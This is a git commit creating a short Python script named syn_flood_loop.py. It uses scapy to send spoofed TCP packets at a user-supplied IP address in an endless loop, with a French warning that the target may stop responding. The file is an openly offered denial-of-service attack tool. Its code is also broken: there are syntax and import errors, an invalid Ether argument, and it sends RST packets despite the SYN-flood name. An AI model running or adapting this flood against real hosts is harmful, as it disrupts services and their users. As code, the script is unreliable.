e025e062fd328b52f83e3fab6b97969b5a0373de
can-er <47574594+can-er@users.noreply.github.com>
2019-10-23 14:47:20 +0200

    Create syn_flood_loop.py

---
+++ syn_flood_loop.py
@@ -0,0 +1,12 @@
+import scapy.all
+
+print("L'adresse IP ciblée risque de ne plus répondre lors de cette attaque".)
+
+dst_ip = input("Entrez l'IP ciblée: ")
+src_ip = scapy.all.RandIP()
+rand_mac = scapy.all.RandMAC()
+
+rst_packet = Ether(mac = rand_mac) / IP(src = src_ip, dst = dst_ip) / TCP(flags = "R") 
+
+while True:
+    sendp(rst_packet)
